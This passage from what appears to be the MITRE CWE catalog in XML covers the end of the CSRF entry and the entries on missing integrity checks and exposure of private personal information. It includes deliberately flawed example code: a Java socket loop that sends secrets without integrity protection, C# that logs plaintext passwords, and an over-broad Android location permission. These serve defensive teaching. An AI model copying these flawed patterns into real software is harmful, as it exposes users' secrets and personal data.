               <Description>Perform actions as administrator via a URL or an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1674</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3520</Reference>
               <Description>modify password for the administrator</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3520</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3022</Reference>
               <Description>CMS allows modification of configuration via CSRF attack against the administrator</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3022</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3759</Reference>
               <Description>web interface allows password changes or stopping a virtual machine via CSRF</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3759</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cross-Site Request Forgery (CSRF)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A5</Entry_ID>
               <Entry_Name>Cross Site Request Forgery (CSRF)</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>9</Entry_ID>
               <Entry_Name>Cross-site Request Forgery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="111"/>
            <Related_Attack_Pattern CAPEC_ID="462"/>
            <Related_Attack_Pattern CAPEC_ID="467"/>
            <Related_Attack_Pattern CAPEC_ID="62"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and&#xA; Response Splitting).&#34; Page 37"/>
            <Reference External_Reference_ID="REF-329"/>
            <Reference External_Reference_ID="REF-330"/>
            <Reference External_Reference_ID="REF-331"/>
            <Reference External_Reference_ID="REF-332"/>
            <Reference External_Reference_ID="REF-333"/>
            <Reference External_Reference_ID="REF-334"/>
            <Reference External_Reference_ID="REF-335"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-956"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
            </Note>
            <Note Type="Theoretical">
               <xhtml:p>The CSRF topology is multi-channel:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Attacker (as outsider) to intermediary (as user). The interaction point is either an external or internal channel.</xhtml:li>
                  <xhtml:li>Intermediary (as user) to server (as victim). The activation point is an internal channel.</xhtml:li>
               </xhtml:ul>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Likelihood_of_Exploit, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Tom Stracener</Modification_Name>
               <Modification_Date>2009-05-20</Modification_Date>
               <Modification_Comment>Added demonstrative example for profile.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationship_Notes, Research_Gaps</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships, Theoretical_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="353" Name="Missing Support for Integrity Check" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses a transmission protocol that does not include a mechanism for verifying the integrity of the data during transmission, such as a checksum.</Description>
         <Extended_Description>If integrity check values or "checksums" are omitted from a protocol, there is no way of determining if data has been corrupted in transmission. The lack of checksum functionality in a protocol removes the first application-level check of data that can be used. The end-to-end philosophy of checks states that integrity checks should be performed at the lowest level that they can be completely implemented. Excluding further sanity checks and input validation performed by applications, the protocol's checksum is the most important level of checksum, since it can be performed more completely than at any previous level and takes into account entire messages, as opposed to single packets.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="354" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>Data that is parsed and used may be corrupted.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Scope>Other</Scope>
               <Impact>Hide Activities</Impact>
               <Impact>Other</Impact>
               <Note>Without a checksum it is impossible to determine if any changes have been made to the data after it was sent.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Add an appropriately sized checksum to the protocol, ensuring that data received may be simply validated before it is parsed and used.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Ensure that the checksums present in the protocol design are properly implemented and added to each message before it is sent.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, a request packet is received, and privileged information is sent to the requester:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>while(true) {<xhtml:div style="margin-left:1em;">DatagramPacket rp = new DatagramPacket(rData,rData.length);<xhtml:br/>outSock.receive(rp);<xhtml:br/>InetAddress IPAddress = rp.getAddress();<xhtml:br/>int port = rp.getPort();<xhtml:br/>out = secret.getBytes();<xhtml:br/>DatagramPacket sp =new DatagramPacket(out, out.length, IPAddress, port);<xhtml:br/>outSock.send(sp);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The response containing secret data has no integrity check associated with it, allowing an attacker to alter the message without detection.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Failure to add integrity check value</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="14"/>
            <Related_Attack_Pattern CAPEC_ID="389"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="665"/>
            <Related_Attack_Pattern CAPEC_ID="74"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 15: Not Updating Easily.&#34; Page 231"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2010-12-13">Failure to Add Integrity Check Value</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="359" Name="Exposure of Private Personal Information to an Unauthorized Actor" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product does not properly prevent a person's private, personal information from being accessed by actors who either (1) are not explicitly authorized to access the information or (2) do not have the implicit consent of the person about whom the information is collected.</Description>
         <Extended_Description>
            <xhtml:p>There are many types of sensitive information that products must protect from attackers, including system data, communications, configuration, business secrets, intellectual property, and an individual's personal (private) information.  Private personal information may include a password, phone number, geographic location, personal messages, credit card number, etc.  Private information is important to consider whether the person is a user of the product, or part of a data set that is processed by the product.  An exposure of private information does not necessarily prevent the product from working properly, and in fact the exposure might be intended by the developer, e.g. as part of data sharing with other organizations.  However, the exposure of personal private information can still be undesirable or explicitly prohibited by law or regulation.</xhtml:p>
            <xhtml:p>Some types of private information include:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Government identifiers, such as Social Security Numbers</xhtml:li>
                  <xhtml:li>Contact information, such as home addresses and telephone numbers</xhtml:li>
                  <xhtml:li>Geographic location - where the user is (or was)</xhtml:li>
                  <xhtml:li>Employment history</xhtml:li>
                  <xhtml:li>Financial data - such as credit card numbers, salary, bank accounts, and debts</xhtml:li>
                  <xhtml:li>Pictures, video, or audio</xhtml:li>
                  <xhtml:li>Behavioral patterns - such as web surfing history, when certain activities are performed, etc.</xhtml:li>
                  <xhtml:li>Relationships (and types of relationships) with others - family, friends, contacts, etc.</xhtml:li>
                  <xhtml:li>Communications - e-mail addresses, private messages, text messages, chat logs, etc.</xhtml:li>
                  <xhtml:li>Health - medical conditions, insurance status, prescription records</xhtml:li>
                  <xhtml:li>Account passwords and other credentials</xhtml:li>
               </xhtml:ul>
            <xhtml:p>Some of this information may be characterized as PII (Personally Identifiable Information), Protected Health Information (PHI), etc. Categories of private information may overlap or vary based on the intended usage or the policies and practices of a particular industry.</xhtml:p>
            <xhtml:p>Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Privacy violation</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Privacy leak</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Privacy leakage</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
            <xhtml:p>Private personal data can enter a program in a variety of ways:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Directly from the user in the form of a password or personal information</xhtml:li>
                  <xhtml:li>Accessed from a database or other data store by the application</xhtml:li>
                  <xhtml:li>Indirectly from a partner or other third party</xhtml:li>
               </xhtml:ul>
               <xhtml:p>If the data is written to an external location - such as the console, file system, or network - a privacy violation may occur.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>
            <xhtml:p>Identify and consult all relevant regulations for personal privacy.  An organization may be required to comply with certain federal and state regulations, depending on its location, the type of business it conducts, and the nature of any private data it handles.  Regulations may include Safe Harbor Privacy Framework [REF-340], Gramm-Leach Bliley Act (GLBA) [REF-341], Health Insurance Portability and Accountability Act (HIPAA) [REF-342], General Data Protection Regulation (GDPR) [REF-1047], California Consumer Privacy Act (CCPA) [REF-1048], and others.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
            <xhtml:p>Carefully evaluate how secure design may interfere with privacy, and vice versa.  Security and privacy concerns often seem to compete with each other. From a security perspective, all important operations should be recorded so that any anomalous activity can later be identified. However, when private data is involved, this practice can in fact create risk. Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code contains a logging statement that tracks the contents of records added to a database by storing them in a log file. Among other values that are stored, the getPassword() function returns the user-supplied plaintext password associated with the account.</Intro_Text>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>pass = GetPassword();<xhtml:br/>...<xhtml:br/>dbmsLog.WriteLine(id + ":" + pass + ":" + type + ":" + tstamp);</xhtml:div>
               </Example_Code>
               <Body_Text>The code in the example above logs a plaintext password to the filesystem. Although many developers trust the filesystem as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-111">
               <Intro_Text>This code uses location to determine the user's current US State location.</Intro_Text>
               <Body_Text>First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:</Body_Text>
               <Example_Code Nature="Bad" Language="XML">
                  <xhtml:div>&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>locationClient = new LocationClient(this, this, this);<xhtml:br/>locationClient.connect();<xhtml:br/>Location userCurrLocation;<xhtml:br/>userCurrLocation = locationClient.getLastLocation();<xhtml:br/>deriveStateFromCoords(userCurrLocation);</xhtml:div>
               </Example_Code>
               <Body_Text>While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In 2004, an employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [REF-338]. In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Privacy Violation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>FIO13-J</Entry_ID>
               <Entry_Name>Do not log sensitive information outside a trust boundary</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="464"/>
            <Related_Attack_Pattern CAPEC_ID="467"/>
            <Related_Attack_Pattern CAPEC_ID="498"/>
            <Related_Attack_Pattern CAPEC_ID="508"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-338"/>
            <Reference External_Reference_ID="REF-339"/>
            <Reference External_Reference_ID="REF-340"/>
            <Reference External_Reference_ID="REF-341"/>
            <Reference External_Reference_ID="REF-342"/>
            <Reference External_Reference_ID="REF-343"/>
            <Reference External_Reference_ID="REF-267"/>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-1047"/>
            <Reference External_Reference_ID="REF-1048"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry overlaps many other entries that are not organized around the kind of sensitive information that is exposed.  However, because privacy is treated with such importance due to regulations and other factors, and it may be useful for weakness-finding tools to highlight capabilities that detect personal private information instead of system information, it is not clear whether - and how - this entry should be deprecated.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Other_Notes, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Other_Notes, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Other_Notes, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description, Name, Other_Notes, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
